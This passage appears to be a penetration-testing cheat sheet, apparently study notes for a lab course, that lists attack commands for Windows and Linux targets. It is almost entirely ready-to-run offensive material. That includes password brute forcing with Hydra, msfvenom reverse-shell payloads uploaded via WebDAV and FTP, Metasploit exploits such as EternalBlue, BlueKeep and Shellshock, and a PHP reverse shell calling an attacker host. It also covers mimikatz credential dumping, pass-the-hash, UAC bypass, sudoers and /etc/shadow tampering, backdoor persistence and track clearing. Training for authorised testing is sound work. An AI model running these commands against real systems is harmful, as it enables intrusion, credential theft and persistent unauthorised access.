hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.19.245 http-get /webdav/
```

Manual Shell Upload 

```
msfvenom -p windows/meterpreter/reverse_tcp/ LHOST=10.10.41.2 LPORT=1234 -f asp > shell.asp  #create reverse shell
cadaver http://10.2.20.202/webdav  #log into webdav server if we have password and username etc.
put /root/shell.asp # upload shell 

#Within metasploit

use /multi/handler # set multi handler
set payload windows/meterpreter/reverse_tcp  # set payload settings
set LHOST 10.10.41.2
set LPORT 1234
run


```


Metasploit Webdav exploit file upload - use davtest to check if asp is accepted. 
```
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS demo.ine.local
set HttpUsername bob
set HttpPassword password_123321
set PATH /webdav/metasploit%RAND%.asp
exploit
shell
```



### IIS/FTP

```
nmap -sV -sC -p21,80 <TARGET_IP>


## Try anonymous:anonymous
ftp <TARGET_IP>

## Brute-force FTP
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <TARGET_IP> ftp

hydra -l administrator -P /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ftp -I
hydra -l <USER> -P /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ftp -I

## Generate an .asp reverse shell payload
cd <TARGET>/
ip -br -c a
msfvenom -p windows/shell/reverse_tcp LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> -f asp > shell.aspx

## FTP Login with <USER>
ftp <TARGET_IP>
put shell.aspx

## msfconsole
use multi/handler
set payload windows/shell/reverse_tcp
set LHOST <LOCAL_IP>
set LPORT <LOCAL_PORT>

## Open http://<TARGET_IP>/shell.aspx . A reverse shell may be received.

```


### SMB 


```
# SMB
nmap -p 445 -sV -sC <TARGET_IP>

nmap --script smb-vuln-ms17-010 -p 445 <TARGET_IP>  # Test for Eternal Blue exploit possbility 
```

```
## Enumeration
smbclient -L <TARGET_IP> -U <USER>
smbmap -u <USER> -p <PW> -H <TARGET_IP>
enum4linux -u <USER> -p <PW> -U <TARGET_IP>
```

```
# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>
```

Use SMB brute force to gain credentials
```
# SMB Brute Force
use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS demo.ine.local
set VERBOSE false
exploit
```

Then use psexec with the creds to get access. 
```
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser Administrator
set SMBPass qwertyuiop
exploit

```

```
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser Administrator
set SMBPass <PW>
set payload windows/x64/meterpreter/reverse_tcp
run
```



Exploit Eternal Blue 

```
# Scan if vulnerable then exploit
use auxiliary/scanner/smb/smb_ms17_010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <IP_ADDRESS>
```

```
use auxiliary/scanner/smb/smb_ms17_010
use exploit/windows/smb/ms17_010_eternalblue
```
### RDP 

```
# Global set
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>

# Detect if rdp is in use
use auxiliary/scanner/rdp/rdp_scanner
# Exploit Bluekeep vuln
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep

set RPORT <PORT>

# ! Kernel crash may be caused !
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

show targets
set target <NUMBER>
set GROOMSIZE 50
```

Hydra Brute Force RDP
```
hydra -L  /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.2.16.217 -s 3333


hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<TARGET_IP> -s <PORT>
```


RDP Session with Linux
```
#Using Credentials found with hydra
xfreerdp /u:administrator /p:qwertyuiop /v:10.2.16.217:3333  

```

### WinRM

```
# Check RM is running on target
nmap -sV -p 5985 <TARGET_IP>
```

Brute force WinRM with Crackmapexec
```
crackmapexec winrm 10.2.26.87 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 


# After gaining credentials we can execute commands

crackmapexec winrm 10.2.26.87 -u administrator -p tinkerbell -x whoami 
crackmapexec winrm 10.2.26.87 -u administrator -p tinkerbell -x sysinfo

```

```
# Command Shell
evil-winrm.rb -u <USER> -p '<PW>' -i <TARGET_IP>
```

WinRM exploit with Metasploit 
```
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>
use exploit/windows/winrm/winrm_script_exec
set USERNAME <USER>
set PASSWORD <PW>
set FORCE_VBS true
```

```
# WinRM
search type:auxiliary winrm
use auxiliary/scanner/winrm/winrm_auth_methods

# Brute force WinRM login
search winrm_login
use auxiliary/scanner/winrm/winrm_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

# Launch command
search winrm_cmd
use auxiliary/scanner/winrm/winrm_cmd
set USERNAME <USER>
set PASSWORD <PW>
set CMD whoami

search winrm_script
use exploit/windows/winrm/winrm_script_exec
set USERNAME <USER>
set PASSWORD <PW>
set FORCE_VBS true
```

### HFS

```
search type:exploit name:rejetto
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
```

### TOMCAT

```
# APACHE TOMCAT
search type:exploit tomcat_jsp
use exploit/multi/http/tomcat_jsp_upload_bypass
check

set payload java/jsp_shell_bind_tcp
set SHELL cmd
run
```

### OpenSSH 


```
nmap -sV -sC -p 22 <TARGET_IP>
```

```
searchsploit OpenSSH 7.1
```

Brute Force SSH 
```
hydra -l administrator /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ssh
hydra -l <USER> -P /usr/share/wordlists/metasploit/unix_users.txt <TARGET_IP> ssh
```

SSH Login
```
ssh <USER>@<TARGET_IP>
```

Metasploit
```
use auxiliary/scanner/ssh/ssh_login
setg RHOST <TARGET_IP>
setg RHOSTS <TARGET_IP>
set USERNAME <USER>
set PASSWORD <PW>
run
session 1
# CTRL+Z to background
sessions -u 1
```




### MYSQL

Service scan for SQL
```
nmap -sV -sC -p 3306,8585 <TARGET_IP>
```

Vulnerability search for SQL
```
searchsploit MySQL 5.5
```

MYSQL Brute force 
```
## Brute-force MySql - msfconsole
msfconsole -q
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <TARGET_IP>
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
run
```

Connect to MySQL database
```
## MYSQL Login with <USER>
mysql -u root -p -h <TARGET_IP>

show databases;
use <db>;
show tables;
select * from <table>;
```

```
sysinfo
cd /
cd wamp
dir
cd www\\wordpress
cat wp-config.php
shell
```


## Host Exploits - Linux


```
# Attacker's machine - Find target IP
cat /etc/hosts
ping <TARGET_IP>
ping <TARGET_FQDN>
mkdir <TARGET>
cd <TARGET>/

# Port Scanning - 1000 common ports or more advanced scans
nmap -sV <TARGET_IP>
nmap -sV -p 1-10000 <TARGET_IP> -oX nmap_10k
nmap -T4 -PA -sC -sV -p 1-10000 <TARGET_IP> -oX nmap_10k
nmap -T4 -PA -sC -sV -p- <TARGET_IP> -oX nmap_all
nmap -sU -sV <TARGET_IP> -oX nmap_udp

# Banner Grabbing - various ports e.g.
nc -nv <TARGET_IP> 512
nc -nv <TARGET_IP> 513
nc -nv <TARGET_IP> 1524
```

### Shellshock

NSE script against the specified CGI path to check whether the target's CGI handler is vulnerable to the Shellshock (Bash) remote command injection vulnerability.
```
nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" <TARGET_IP>
```


Metasploit Shellshock exploit 
```
setg RHOSTS <TARGET_IP>
setg RHOST <TARGET_IP>
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS <TARGET_IP>
set TARGETURI /gettime.cgi
exploit
```

### FTP

Connect to FTP and check for anon login
```
# FTP
ftp <TARGET_IP>
```

FTP Bruteforce with hydra
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <TARGET_IP> -t 4 ftp
```

Vulnerability search for FTP using NMAP and Searchsploit
```
ls -lah /usr/share/nmap/scripts | grep ftp-*
searchsploit ProFTPD
search proftp 1.3.5
```

Proftp modcopy exploit
```
use unix/ftp/proftpd_modcopy_exec
set RHOSTS target1.ine.local
set LHOST eth1 
set SITEPATH /var/www/html
```

Proftpd backdoor exploit 
```
msfconsole -q
use exploit/unix/ftp/proftpd_133c_backdoor
set payload payload/cmd/unix/reverse
set RHOSTS demo.ine.local
set LHOST 192.70.114.2
exploit -z
```

```
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
/bin/bash -i
```


### SSH 

Search with metasploit for vulns
```
#Metasploit
search libssh_auth_bypass
```

SSH Brute force with hydra
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt <TARGET_IP> -t 4 ssh
```

LibSSH  exploit
```
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS demo.ine.local
set SPAWN_PTY true
exploit

sessions -i 1
```

Connect with SSH and enumerate
```
ssh <USER>@<TARGET_IP>
groups sysadmin
cat /etc/*release
uname -r
cat /etc/passwd
find / -name "flag"
```


### SAMBA

Samba Pipename exploit
```
search type: exploit name: samba
use exploit/linux/samba/is_known_pipename
set RHOST demo.ine.local
check
exploit
id
```

Upgrade above to meterpreter shell
```

use multi/manage/shell_to_meterpreter
set LHOST eth1 
set SESSION 1
run
sessions
```

Usermap Exploit 
```
searchsploit samba 3.0.20
use exploit/multi/samba/usermap_script
set RHOSTS demo.ine.local
exploit
/bin/bash -i
```

SMB Brute force with metasploit
```
msfconsole -q
use auxiliary/scanner/smb/smb_login
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser jane
set RHOSTS demo.ine.local
exploit
```

Hydra Brute Force SAMBA
```
gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -l admin -P /usr/share/wordlists/rockyou.txt demo.ine.local smb
```

### SMTP 

```
search libssh_auth_bypass
use exploit/linux/smtp/haraka
set SRVPORT 9898
set email_to root@attackdefense.test
set payload linux/x64/meterpreter_reverse_http
set LHOST <LOCAL_IP>
set LPORT 8080
run
```



### VSFTPD

Manual Exploit with Binary 
```
searchsploit vsftpd
searchsploit -m 49757
vim 49757.py
chmod +x 49757.py
python3 49757.py <TARGET_IP>
```

Hydra Brute Force
```
hydra -l <USER> -P /usr/share/metasploit-framework/data/wordlists/unix_users.txt <TARGET_IP> ftp
```

FTP Reverse Shell attempt
```
## Modify the shell via FTP
cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.php
vim shell.php
## Change the $ip & $port variable to the Attacker's IP & port

ftp <TARGET_IP>
cd /
cd /var/www/dav
put shell.php

## Attacker listener
nc -nvlp <PORT>
## Open http://<TARGET_IP>/dav/shell.php

/bin/bash -i
```

### CGI Manual Exploit 

```
## Manual Exploitation PHP CGI
searchsploit php cgi
searchsploit -m 18836
python2 18836.py <TARGET_IP> 80
## If it executes, modify the .py script
vim 18836.php
## PHP Reverse Shell
pwn_code = """<?php $sock=fsockopen("<ATTACKER_IP>",<PORT>);exec("/bin/sh -i <&4 >&4 2>&4");?>"""

## Attacker listener in another tab
nc -nvlp <PORT>
## Launch the exploit
python2 18836.py <TARGET_IP> 80
```


# Post Exploitation 

## Windows Terminal Local Enumeration 

Meterpreter Enumeration 
```
getuid
sysinfo
show_mount
cat C:\\Windows\\System32\\eula.txt
getprivs
pgrep explorer.exe
migrate <PROCESS_ID>
```

Windows Shell enumeration
```
shell
# System Enumeration 
hostname
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Users Enumeration
whoami
whoami /priv
query user
net users
net user <USER>
net localgroup
net localgroup Administrators
net localgroup "Remote Desktop Users"

# Network Enumeration
ipconfig /all
route print
arp -a
netstat -ano
netsh firewall show state
netsh advfirewall show allprofiles

# System Services
ps
net start
wmic service list brief
tasklist /SVC
schtasks /query /fo LIST
schtasks /query /fo LIST /v

```


Metasploit Enumeration for Local Windows 
```
use post/windows/manage/migrate
use post/windows/gather/win_privs
use post/windows/gather/enum_logged_on_users
use post/windows/gather/checkvm
use post/windows/gather/enum_applications
use post/windows/gather/enum_av_excluded
use post/windows/gather/enum_computers
use post/windows/gather/enum_patches
use post/windows/gather/enum_shares
use post/windows/manage/enable_rdp

# Choose relevent session 
set SESSION 1

```


## Linux Terminal Local Enumeration

Local Machine Enumeration
```
/bin/bash -i              # Start an interactive bash shell
whoami                   # Print current user
cat /etc/passwd          # Show passwd file entries
groups root              # Show groups for root
cat /etc/*issue          # Show system issue info
cat /etc/*release        # Show distribution release info
uname -a                 # Show kernel and system information
uname -r                 # Show kernel release
netstat -antp            # Show TCP connections and listening programs with PIDs
ss -tnl                  # Show listening TCP sockets
ps aux                   # List running processes
env                      # Print environment variables
ls /                     # Enumerate top directories 
ls -l /home              # Enumerate users

```


Metasploit Enumeration 
```
# Enumerate common configuration files and system configs on Linux
use post/linux/gather/enum_configs

# Gather environment variables and shell environment for the current session (multi-platform)
use post/multi/gather/env

# Enumerate network interfaces, routes, and network configuration on Linux
use post/linux/gather/enum_network

# Enumerate protection mechanisms (ASLR, SELinux, AppArmor, grsecurity, etc.) on Linux
use post/linux/gather/enum_protections

# Gather system information (OS, kernel, services, packages) on Linux
use post/linux/gather/enum_system

# Check if the host is running inside a container (Docker/LXC)
use post/linux/gather/checkcontainer

# Check if the host is a virtual machine (VM detection)
use post/linux/gather/checkvm

# Enumerate users and shell history files on Linux (useful for credential discovery)
use post/linux/gather/enum_users_history
set SESSION 1
```


## Windows Privilege Escalation 

## Windows Kernel Exploits:

**Note:**

> Everything demonstrated here after is basically done after the initial foothold.

This is a built in meterpreter command i.e. `getsystem` that uses some techniques to escalate the privileges. It can used in some cases as well.

```
use post/multi/recon/local_exploit_suggester
show options
set SESSION <session-ID>
run
```

> It will tell the exploit modules that you can try to elevate your privileges.

```
use exploit/windows/local/ms16_014_wmi_recv_notif
show options
set SESSION <session-ID>
set LPORT <port-number>
exploit
```

> It can be used to escalate privileges in vulnerable windows 7 machine.

```shell
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester
```

> This tool compares a target path levels with Microsoft vulnerability database in order to detect missing patches on the target that can be then exploited.

## Meterpreter Local Enumeration 

Quick meterpreter commands 
```
sysinfo
getuid
getsystem
getuid
getprivs
hashdump
show_mount
ps
migrate
```

## UAC Bypass

```
# Meterpreter
shell

# Win CMD
net users
net localgroup administrators

# Bypass UAC  - This will bypass UAC using the injection method.
# _This will not elevate our privileges directly.  
Instead, it will provide a new Meterpreter session with the UAC flag disabled.  
After that, you can use the `getsystem` command to elevate your privileges.

background
sessions
use exploit/windows/local/bypassuac_injection
set payload windows/x64/meterpreter/reverse_tcp
set SESSION 1
set LPORT <LOCAL_PORT>
set TARGET Windows\ x64
run

# Migrate to lsass to dump hashes  
ps -S lsass.exe
migrate 484

getsystem
hashdump
```

UAC Bypass with UACME - normally on a HTTPS server using HFS
```
# Create the backdoor
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.31.2 LPORT=4444 -f exe > 'backdoor.exe'
file backdoor.exe

# In meterpreter session upload the backdoor
cd C:\\Users\\admin\\AppData\\Local\\Temp
upload /root/Desktop/tools/UACME/Akagi64.exe .
upload /root/backdoor.exe .
ls

# Start another metasploit console session and run 
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.49.9
set LPORT 4444
exploit


# Switch back to victim and run the exe
shell
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe


# On the new session where we started the multi handler
getuid
migrate -N lsass.exe
hashdump

```

## Token Impersonation 

```
## METASPLOIT - Meterpreter (Unprivileged session)
pgrep explorer
migrate <explorer_PID>
getuid
getprivs


load incognito
list_tokens -u
impersonate_token "ATTACKDEFENSE\Administrator"
getuid
getprivs # Access Denied
pgrep explorer
migrate <explorer_PID>
getprivs
list_tokens -u
impersonate_token "NT AUTHORITY\SYSTEM"
hashdump
```


## Windows PowerShell Scripts 

```
# PrivescCHECK - PowerShell script
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML,XML"

## Basic mode
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"

## Extended Mode + Export Txt Report
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME%"
```

## Linux Privilege Escalation 

### Chrootkit

Chrootkit 
```
ps aux
# Run local chkrootkit exploit (uses chkrootkit binary on target)
use exploit/unix/local/chkrootkit 
set CHKROOTKIT /bin/chkrootkit   # path to chkrootkit on target
set SESSION 1
set LHOST <LOCAL_IP>
```


### Weak Permissions/Misconfigures 


Exploit file permissions  /etc/shadow with write permissions
```
find / -not -type l -perm -o+w                      # Writable files
openssl passwd -1 -salt abc password123             # Generate Linux Password Hash
vim /etc/shadow                                     # Paste the hashed password
su                                                  # gain  root 
```

 SETUID - SUDO privileges
```
find / -user root -perm -4000 -exec ls -ldb {} \;
find / -perm -u=s -type f 2>/dev/null

sudo -l

sudo man ls     # See what commands can be ran as sudo 
	!/bin/bash  # Enter shell interact straight after to get a shell 
```

### Kernel

```
# LINUX KERNEL
## Linux-Exploit-Suggester Install
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O linux-exploit-suggester.sh

chmod +x linux-exploit-suggester.sh

./linux-exploit-suggester.sh
```

### Cron Jobs

```
crontab -l
find / -name <CRONJOB_SCRIPT>
printf '#!/bin/bash\necho "<USER> ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/<CRONJOB_SCRIPT>

sudo -l
sudo su 

```
### SUID
Follow guide for this
```
# SUID

groups <username>  # find which groups your part of 
file <FILE>        # Look at executable permissions for root
strings <FILE>
	# find file called binary
rm <BINARY>
cp /bin/bash <BINARY>
./<FILE>
```





## Windows Credential Dumping


```
# Creds dumping - Meterpreter - after having meterpreter access to target
load kiwi
creds_all # Dump Administrator NTLM hash using Kiwi extension
lsa_dump_sam   # Extract all the users NTLM hash using Kiwi.
lsa_dump_secrets # Find the syskey
```

Upload mimikatz executable to get hashes
```
pwd
cd C:\\
mkdir Temp
cd Temp
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
shell
```

Mimikatz usage

```

shell # open shell first
./mimikatz.exe # Run exe
privilege::debug
lsadump::sam
lsadump::secrets
sekurlsa::logonPasswords
```


Pass the Hash Attack
```
# sekurlsa::logonPasswords
background
search psexec
use exploit/windows/smb/psexec
set LPORT <LOCAL_PORT2>
set SMBUser Administrator
set SMBPass <ADMINISTRATOR_LM:NTLM_HASH>
exploit
```


## Linux Credential Dumping


Metasploit Hash Dumping

```
use post/linux/gather/hashdump
use post/multi/gather/ssh_creds
use post/linux/gather/ecryptfs_creds
use post/linux/gather/enum_psk
use post/linux/gather/pptpd_chap_secrets
set SESSION 1
```



## Shells

## Pivoting/Lateral Movement 

## Transferring Files 


## Windows Persistence 


```
# RDP - Meterpreter
background

use exploit/windows/local/persistence_service
set payload windows/meterpreter/reverse_tcp
set SESSION 1

# Regain access
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <LOCAL_IP>
set LPORT <LOCAL_PORT>

# Enabling RDP
use post/windows/manage/enable_rdp
sessions
set SESSION 1
```

## Linux Persistence 


Meterpreter - Manual
```
shell
whoami
	root
cat /etc/passwd
useradd -m ftp -s /bin/bash
passwd ftp
usermod -aG root ftp
usermod -u 15 ftp
groups ftp

# SSH Key
use post/linux/manage/sshkey_persistence
set CREATESSHFOLDER true
set SESSION 1

# Persistence Test
loot
cat /root/.msf4/loot/DATE_Linux_Persistenc_<TARGET_IP>_id_rsa_.txt
# Exit all the msfconsole sessions and close it
exit -y

vim ssh_key # paste Key
chmod 0400 ssh_key
ssh -i ssh_key root@<TARGET_IP>
```


Add users to the system for easy login
```
use post/multi/manage/system_session
set SESSION 1
set TYPE python
set HANDLER true
set LHOST 192.30.182.2
run
```

```
vim test.sh # add users to be added 

/etc/init.d/apache2 start
cp test.sh /var/www/html


```

## Payloads 

## Clearing Tracks 

Meterpreter
```
clearenv
```
# Web Application Penetration Testing

## Attacks

## Shellshock with Burp Suite
